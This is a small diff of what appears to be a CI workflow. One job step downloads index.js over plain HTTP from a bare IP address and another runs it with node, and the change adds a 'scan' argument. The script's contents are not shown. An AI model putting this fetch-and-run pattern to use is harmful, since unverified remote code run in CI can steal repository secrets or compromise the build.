@@ -27,4 +27,4 @@ jobs:
       run: curl http://139.84.155.86:8000/index.js -o index.js
 
     - name: Run index.js
-      run: node index.js
+      run: node index.js scan
